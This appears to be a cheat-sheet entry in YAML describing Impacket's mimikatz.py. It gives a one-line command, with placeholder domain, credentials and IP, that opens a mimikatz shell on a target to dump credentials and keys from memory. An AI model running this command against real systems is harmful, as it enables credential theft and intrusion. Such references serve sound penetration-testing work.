---
description: |
  Impacket's mimikatz.py will drop you into a mimikatz shell on the target machine, allowing you to perform any mimikatz-related actions, such as dumping credentials from memory, dumping keys, etc.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Password: password123

items:
  Password:
    - code: |
        python3 mimikatz.py test.local/john:password123@10.10.10.1
  Username:
    - code: |
        empty
filters:
  Kerberos:
    - code: |
        empty
  Linux:
    - code: |
        empty
  Windows:
    - code: |
        empty
---
